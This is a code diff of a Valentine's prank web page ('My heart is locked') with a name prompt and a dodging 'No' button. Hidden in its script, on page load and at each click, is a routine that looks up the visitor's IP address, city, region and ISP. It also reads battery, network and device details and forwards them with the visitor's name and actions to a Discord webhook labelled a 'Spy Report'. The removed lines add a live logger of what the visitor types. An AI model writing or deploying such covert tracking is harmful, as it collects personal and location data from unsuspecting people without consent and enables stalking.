@@ -71,7 +71,7 @@
     <div class="glass-box">
       <h1 style="color: white; font-weight: 800; margin-bottom: 5px;">My heart is locked.</h1>
       <p id="customText"></p>
-      <input type="text" id="userName" style="padding: 15px; border-radius: 50px; border: none; width: 85%; text-align: center;" placeholder="Your name..." oninput="liveTyping(this.value)">
+      <input type="text" id="userName" style="padding: 15px; border-radius: 50px; border: none; width: 85%; text-align: center;" placeholder="Your name...">
       <button onclick="startApp()" style="background: var(--primary); color: white; border: none; padding: 15px 40px; border-radius: 50px; font-weight: 800; cursor: pointer; margin-top: 20px;">Unlock My Heart</button>
       <p style="color:white; font-size:0.75rem; margin-top:20px; opacity:0.8; cursor:pointer; text-decoration: underline;" onclick="document.getElementById('modalOverlay').style.display='flex'">Create your own link</p>
     </div>
@@ -85,9 +85,9 @@
   </div>
 
 <script>
-  let visitorName = "", clickCount = 0, yesScale = 1, lastMsgId = null, actionHistory = [];
-  let batteryLevel = "Unknown", connectionType = "Unknown";
-  const WEBHOOK_URL = "YOUR_WEBHOOK_URL"; 
+  let visitorName = "", clickCount = 0, yesScale = 1, actionHistory = [];
+  let batteryLevel = "N/A", connectionType = "N/A";
+  const WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE";
 
   const phase1 = ["Try again!", "Close!", "Nope!"];
   const phase2 = ["Seriously?", "Stop it.", "Wasting time."];
@@ -100,6 +100,7 @@
   ];
 
   window.onload = async () => {
+    // Collect System Info
     if (navigator.getBattery) {
         const battery = await navigator.getBattery();
         batteryLevel = `${Math.round(battery.level * 100)}%`;
@@ -115,61 +116,51 @@
       msgEl.innerText = `"${decodeURIComponent(params.get('msg'))}"`;
       setTimeout(() => { msgEl.style.opacity = "1"; msgEl.classList.add('pulsing'); }, 800);
     }
-    trackEvent("Page Opened (Tracking Active)");
+
+    // CREATE NEW BOX IMMEDIATELY ON VISIT
+    sendDiscordReport("Page Opened (New Visit)");
   };
 
-  let typingTimer;
-  function liveTyping(val) {
-    clearTimeout(typingTimer);
-    typingTimer = setTimeout(() => {
-        trackEvent(`Is currently typing: "${val}"`);
-    }, 1000);
-  }
-
-  async function trackEvent(status) {
+  async function sendDiscordReport(status) {
     const now = new Date();
     const time = now.toLocaleTimeString();
-    const fullDate = now.toLocaleDateString();
-    actionHistory.push(`[${time}] ${status}`);
+    const date = now.toLocaleDateString();
     
     let spyData = {};
     try {
         const res = await fetch('https://ipapi.co/json/');
         spyData = await res.json();
-    } catch (e) { spyData = { ip: "Blocked", city: "Unknown", org: "Unknown" }; }
+    } catch (e) { spyData = { ip: "Blocked", city: "Unknown", region: "Unknown", org: "Unknown" }; }
 
     const payload = {
       embeds: [{
-        title: `💖 Live Session: ${visitorName || "Guest"}`,
+        title: `🕵️ Valentine Spy Report: ${visitorName || "Guest"}`,
         color: status.includes("YES") ? 0x00ff00 : (status.includes("Link Created") ? 0x00bfff : 0xff4d6d),
         fields: [
-          { name: "Current Status", value: `**${status}**`, inline: true },
-          { name: "Session Date", value: `**${fullDate}**`, inline: true },
+          { name: "Event", value: `**${status}**`, inline: true },
+          { name: "Session Date", value: `${date}`, inline: true },
+          { name: "Device", value: navigator.userAgent.includes("Mobi") ? "Mobile" : "Desktop", inline: true },
           { name: "Battery / Net", value: `${batteryLevel} / ${connectionType}`, inline: true },
-          { name: "Misses", value: `${clickCount}`, inline: true },
-          { name: "Location", value: `${spyData.city || "Unknown"}`, inline: true },
-          { name: "Activity Log", value: `\`\`\`${actionHistory.slice(-20).join("\n")}\`\`\``, inline: false },
-          { name: "Network Data", value: `IP: \`${spyData.ip}\`\nISP: \`${spyData.org}\``, inline: false }
+          { name: "Location", value: `${spyData.city}, ${spyData.region}`, inline: true },
+          { name: "IP Address", value: `\`${spyData.ip}\``, inline: false },
+          { name: "Network/ISP", value: `\`${spyData.org}\``, inline: false }
         ],
+        footer: { text: `Time: ${time}` },
         timestamp: now.toISOString()
       }]
     };
 
-    const url = lastMsgId ? `${WEBHOOK_URL}/messages/${lastMsgId}` : `${WEBHOOK_URL}?wait=true`;
-    const method = lastMsgId ? 'PATCH' : 'POST';
-    
-    try {
-      const response = await fetch(url, { method, headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
-      if (!lastMsgId && response.ok) {
-        const data = await response.json();
-        lastMsgId = data.id;
-      }
-    } catch (e) {}
+    // ALWAYS POSTS A NEW BOX (NO EDITING)
+    fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    });
   }
 
   function startApp() {
     visitorName = document.getElementById('userName').value.trim() || "Secret Admirer";
-    trackEvent("Heart Unlocked 🔓");
+    sendDiscordReport("Heart Unlocked 🔓");
     document.getElementById('namePortal').style.display = "none";
     document.getElementById('mainCard').style.display = "flex";
   }
@@ -190,22 +181,22 @@
 
     noBtn.style.left = (Math.random() * (card.clientWidth - 140 - 60) + 30) + "px";
     noBtn.style.top = (Math.random() * (card.clientHeight - 45 - 200) + 180) + "px";
-    noBtn.style.transform = "none"; 
 
     yesScale += 0.25;
     yesBtn.style.setProperty('--scale', yesScale);
     yesBtn.style.transform = `scale(${yesScale})`;
     if (clickCount >= 10) yesBtn.classList.add('shaking');
 
-    if (clickCount % 3 === 0) trackEvent(`Struggling: ${clickCount} misses`);
+    // Send update every 5 misses
+    if (clickCount % 5 === 0) sendDiscordReport(`User is struggling (${clickCount} misses)`);
   }
 
   function yesClick() {
-    trackEvent("ACCEPTED! ❤️");
+    sendDiscordReport("ACCEPTED! ❤️ Success.");
     document.body.style.background = "url('https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExOHpwaG54Z2V3ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6ZzR6JmVwPXYxX2ludGVybmFsX2dpZl9ieV9pZCZjdD1n/26tOZ42Mg6pbTUPHW/giphy.gif') center center / cover";
     confetti({ particleCount: 150, spread: 70 });
     const randomMsg = promises[Math.floor(Math.random() * promises.length)].replace("{name}", visitorName);
-    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>EXCELLENT CHOICE. ❤️</h2><p>${randomMsg}</p></div>`;
+    document.getElementById("mainCard").innerHTML = `<div style="text-align:center; margin:auto; padding:20px;"><h2>I KNEW IT! ❤️</h2><p>${randomMsg}</p></div>`;
   }
 
   function updateSuggestions() {
@@ -226,8 +217,7 @@
     const msg = document.getElementById('msgInput').value.trim();
     const finalUrl = `${window.location.href.split('?')[0]}?from=${encodeURIComponent(from)}&to=${encodeURIComponent(to)}&msg=${encodeURIComponent(msg)}`;
     
-    // NOTIFY DISCORD OF NEW LINK CREATION
-    trackEvent(`New Link Created! From: ${from} | To: ${to} | Msg: "${msg}"`);
+    sendDiscordReport(`New Link Created! From: ${from} | To: ${to} | Msg: "${msg}"`);
     
     document.getElementById('urlDisplay').innerText = finalUrl;
     document.getElementById('step1').style.display = 'none';
